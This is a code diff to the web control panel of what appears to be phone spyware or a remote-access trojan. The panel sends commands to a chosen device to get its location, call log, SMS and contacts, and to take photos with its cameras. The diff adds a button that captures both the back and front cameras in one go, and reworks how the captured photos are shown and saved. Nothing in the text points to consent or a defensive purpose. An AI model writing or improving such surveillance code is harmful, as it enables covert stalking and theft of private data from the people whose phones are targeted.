@@ -330,8 +330,9 @@ table.ct td.ce{color:var(--text2);font-size:11px}
         </div>
         <div class="cmd-grid">
           <button class="cb" onclick="cmd('get_location')">📍 Location</button>
-          <button class="cb" onclick="cmd('capture_back')">📷 Camera</button>
+          <button class="cb" onclick="cmd('capture_back')">📷 Back Cam</button>
           <button class="cb" onclick="cmd('capture_front')">🤳 Selfie</button>
+          <button class="cb green" onclick="cmdBoth()">📷+🤳 Both Cams</button>
           <button class="cb" onclick="cmd('get_call_log')">📞 Call Log</button>
           <button class="cb" onclick="cmd('get_sms')">💬 SMS File</button>
           <button class="cb" onclick="cmd('get_contacts')">👥 Contacts File</button>
@@ -515,6 +516,20 @@ function cmd(action, params={}) {
   sc(action, params);
 }
 
+// Both cameras — clears results first, then sends capture_both
+function cmdBoth() {
+  closeSmsForm();
+  document.getElementById('results').innerHTML = '';
+  delete document.getElementById('active-panel');
+  const r = document.getElementById('results');
+  const info = document.createElement('div');
+  info.id = 'both-status';
+  info.className = 'ri';
+  info.innerHTML = '<div class="rh"><span class="rt">📷+🤳 Both Cameras</span><span class="rtime">' + ts() + '</span></div><div class="rb"><pre>Capturing back camera… selfie follows in ~3 sec</pre></div>';
+  r.appendChild(info);
+  sc('capture_both');
+}
+
 function sc(action, params={}) {
   if (!selId || !ws || ws.readyState !== 1) return;
   ws.send(JSON.stringify({ type:'send_command', deviceId:selId, action, params }));
@@ -572,7 +587,20 @@ function addText(t, tag='📋 Response') {
 
 function addPhoto(m) {
   const src = 'data:image/jpeg;base64,' + m.fileData;
-  showPanel('📷 Photo', `<img src="${src}"><br><a href="${src}" download="${x(m.fileName||'photo.jpg')}" class="dl-link">⬇ Save Photo</a>`);
+  const fname = m.fileName || 'photo.jpg';
+  const isBack = fname.toLowerCase().includes('back');
+  const isFront = fname.toLowerCase().includes('front');
+  const label = isFront ? '🤳 Selfie' : isBack ? '📷 Back Camera' : '📷 Photo';
+  // Remove status card if present (from cmdBoth)
+  const statusEl = document.getElementById('both-status');
+  if (statusEl) statusEl.remove();
+  // Append photo card — never replaces existing ones
+  const r = document.getElementById('results');
+  const card = document.createElement('div');
+  card.className = 'ri';
+  card.innerHTML = `<div class="rh"><span class="rt">${label}</span><span class="rtime">${ts()}</span></div><div class="rb"><img src="${src}"><br><a href="${src}" download="${x(fname)}" class="dl-link">⬇ Save ${x(fname)}</a></div>`;
+  r.appendChild(card);
+  card.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
 }
 
 function addFile(m) {
